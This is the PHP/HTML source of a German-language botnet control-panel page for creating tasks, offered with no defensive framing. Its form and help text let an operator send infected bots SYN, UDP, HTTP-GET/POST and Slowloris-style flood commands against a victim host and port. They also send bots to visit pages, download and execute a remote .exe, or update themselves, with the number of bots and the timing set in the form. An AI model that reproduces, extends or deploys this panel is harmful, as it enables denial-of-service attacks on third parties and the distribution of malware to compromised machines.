<?php
include('login.php');
?>
<br>
<div class="padding">
	<table>
		<tr>
			<td style="text-align:right">Befehl:</td><td><select name="cmdtype" id="cmdtype">
			<option value="!SYN*">SYN</option>
			<option value="!RES*">RES</option>
			<option value="!UDP*">UDP</option>
			<option value="!HTTP-GET*">HTTP-GET</option>
			<option value="!HTTP-POST*">HTTP-POST</option>
			<option value="!SLOWRIS-FLOOD*">SLOWRIS-FLOOD</option>
			<option value="">--------------------</option>
			<option value="!VISIT-PAGE*">VISIT-PAGE</option>
			<option value="!DOWNLOAD*">DOWNLOAD</option>
			<option value="!UPDATE-BOTS*">UPDATE-BOTS</option>
			</select><input id="command" type="text" name="command" value=""/></td>
		</tr>
		<tr>
			<td style="text-align:right;">Bot anzahl:</td><td><input id="bots" type="text" name="bots" value=""/></td>
		</tr>
		<tr>
			<td style="text-align:right;">Startzeit:</td><td><input id="start" type="text" name="start" value="<?php echo date("d.m.Y H:i", time()); ?>" /></td>
		</tr>
		<tr>
			<td style="text-align:right;">Endzeit:</td><td><input id="end" type="text" name="end" value="<?php echo date("d.m.Y H:i", time()); ?>" />
			<select name="type" id="type">
			<option value="once">Ohne Endzeit</option>
			<option value="until">Mit Endzeit</option>
			</select>
			</td>
		</tr>
		<tr>
		</tr>
		<tr>
		<td></td>
		<td colspan="2">
			<input type="submit" value="Task erstellen" name="submit" onClick=                    "newTask(document.getElementById('cmdtype').value,document.getElementById('command').value, document.getElementById('start').value, document.getElementById('bots').value, document.getElementById('type').value, document.getElementById('end').value);" /></td>
		</tr>
	</table>
<div class="font padding">
	<h2>DDoS Befehle:</h2>
	<ul>
	<li>SYN: victimhost.com*Port </li>
	<li>RES: victimhost.com*Port </li>
	<li>UDP: 127.0.0.1*Port </li>
	<li>HTTP-GET: http://www.victimhost.com/index.php*Threads </li>
	<li>HTTP-POST: http://www.victimhost.com/index.php*Threads </li>
	<li>SLOWRIS-FLOOD: victimhost.com*Port </li>
	</ul>
	<h2>Sonstige Befehle:</h2>
	<ul>
	<li>VISIT-PAGE: http://yourlink.com/*0 = Sichtbar</li>
	<li>VISIT-PAGE: http://yourlink.com/*1 = Unsichtbar</li>
	<li>DOWNLOAD & EXECUTE: http://yourlink.com/yourfile.exe</li>
	<li>UPDATE-BOTS: http://yourlink.com/yourfile.exe</li>
	</ul>
	</div>